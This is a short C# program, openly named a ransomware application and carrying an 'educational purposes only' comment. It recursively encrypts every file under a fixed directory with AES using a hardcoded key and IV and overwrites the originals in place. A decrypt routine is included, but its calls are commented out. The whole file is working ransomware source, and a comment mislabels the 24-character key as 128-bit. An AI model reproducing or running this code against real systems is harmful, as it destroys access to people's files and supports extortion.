using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace RansomwareApplication
{
    /*
     Note: This code is for educational purposes only. Writing and distributing ransomware is illegal and unethical.
     */

    class Program
    {
        private static string key = "abcdefghijklmnopqrstuvwx"; // 128-bit key
        private static string iv = "1234567890123456"; // 128-bit IV
        static void Main(string[] args)
        {
            string targetDirectory = @"D:\Document";
            EncryptFiles(targetDirectory);
        }

        static void EncryptFiles(string directory)
        {
            string[] files = Directory.GetFiles(directory, "*.*", SearchOption.AllDirectories);

            foreach (string file in files)
            {
                string fileName = Path.GetFileName(file);
                byte[] data = File.ReadAllBytes(file);
                byte[] encrypt = EncryptData(data);
                File.WriteAllBytes(file, encrypt);
                //byte[] decrypt = Decrypt(data);
                //File.WriteAllBytes(file, decrypt);
            }
        }

        static byte[] EncryptData(byte[] data)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Encoding.UTF8.GetBytes(key);
                aesAlg.IV = Encoding.UTF8.GetBytes(iv);

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        csEncrypt.Write(data, 0, data.Length);
                        csEncrypt.FlushFinalBlock();
                    }
                    return msEncrypt.ToArray();
                }
            }
        }
        public static byte[] Decrypt(byte[] encryptedData)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Encoding.UTF8.GetBytes(key);
                aesAlg.IV = Encoding.UTF8.GetBytes(iv);

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msOutput = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msOutput);
                            return msOutput.ToArray();
                        }
                    }
                }
            }
        }
    }
}